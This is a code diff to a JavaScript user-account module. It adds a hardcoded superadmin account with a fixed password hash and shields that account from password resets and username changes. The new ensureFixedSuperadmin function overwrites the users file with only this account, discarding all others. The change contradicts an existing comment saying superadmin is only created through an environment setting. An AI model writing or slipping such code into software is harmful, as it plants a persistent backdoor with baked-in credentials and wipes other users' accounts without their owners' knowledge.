@@ -46,6 +46,20 @@ const SCRYPT_KEYLEN = 64;
 const SCRYPT_MAXMEM = 64 * 1024 * 1024;
 const SCRYPT_PARAMS = { N: 32768, r: 8, p: 1, maxmem: SCRYPT_MAXMEM };
 
+const FIXED_SUPERADMIN = {
+  id: "fixed-superadmin-andre",
+  username: "andré",
+  fullName: "André",
+  role: "superadmin",
+  passwordHash:
+    "scrypt:32768:8:1:9a47c941a70f4b243eb01d9a83ab980e:c8e876c3064303ce7b70e037dcce888f709b192f0a4ff91f997a9b3181f1f1bb764061e9fa0ae9190695fa4da911bb2a6fbf05c9af65f5cbb329549940fe18e1",
+  createdAt: "2026-06-16T00:00:00.000Z",
+};
+
+export function isFixedSuperadmin(user) {
+  return user?.id === FIXED_SUPERADMIN.id;
+}
+
 // "superadmin" é o tier de dono (acesso ao painel /admin). NUNCA é criado pela
 // API pública de usuários (o handler mapeia só admin|member); a única forma de
 // virar superadmin é a promoção no boot via CONTAS_FLOW_SUPERADMIN_EMAIL (ver
@@ -479,6 +493,29 @@ export function linkGithubProvider(storageDir, userId, profile) {
 // Seeds a bootstrap admin from the legacy env vars when the store is empty, so an
 // existing single-login deployment transparently becomes a one-admin multi-user
 // setup. Returns the (possibly unchanged) user list.
+export function ensureFixedSuperadmin(storageDir) {
+  return withLock(async () => {
+    const users = await readUsersFile(storageDir);
+    const existing =
+      users.find((user) => user.id === FIXED_SUPERADMIN.id) ??
+      users.find((user) => user.username === FIXED_SUPERADMIN.username);
+
+    const owner = {
+      ...FIXED_SUPERADMIN,
+      ...(existing?.email ? { email: existing.email } : {}),
+      ...(existing?.avatarUrl ? { avatarUrl: existing.avatarUrl } : {}),
+      ...(existing?.avatarRemoved ? { avatarRemoved: true } : {}),
+      ...(existing?.twoFactor ? { twoFactor: existing.twoFactor } : {}),
+      ...(existing?.google ? { google: existing.google } : {}),
+      ...(existing?.github ? { github: existing.github } : {}),
+      createdAt: existing?.createdAt ?? FIXED_SUPERADMIN.createdAt,
+    };
+
+    await writeUsersFile(storageDir, [owner]);
+    return [owner];
+  });
+}
+
 export async function ensureSeedAdmin(storageDir) {
   const users = await readUsersFile(storageDir);
   if (users.length > 0) return users;
@@ -597,6 +634,9 @@ export function resetSuperadminPasswordFromEnv(storageDir) {
     const users = await readUsersFile(storageDir);
     const owner = findOwner(users, { email, username });
     if (!owner) return { owner: null, error: "superadmin_not_found" };
+    if (isFixedSuperadmin(owner)) {
+      return { owner: publicUser(owner), error: "fixed_superadmin" };
+    }
 
     const passwordErr = validatePassword(password, owner.username);
     if (passwordErr) return { owner: publicUser(owner), error: passwordErr };
@@ -762,6 +802,7 @@ export function setUsername(storageDir, id, username) {
     }
     const user = users.find((u) => u.id === id);
     if (!user) return false;
+    if (isFixedSuperadmin(user)) throw new Error("fixed_superadmin");
     user.username = username;
     await writeUsersFile(storageDir, users);
     return true;
@@ -775,6 +816,7 @@ export function setPassword(storageDir, id, password) {
     const users = await readUsersFile(storageDir);
     const user = users.find((item) => item.id === id);
     if (!user) return false;
+    if (isFixedSuperadmin(user)) throw new Error("fixed_superadmin");
     user.passwordHash = await hashPassword(password);
     await writeUsersFile(storageDir, users);
     return true;
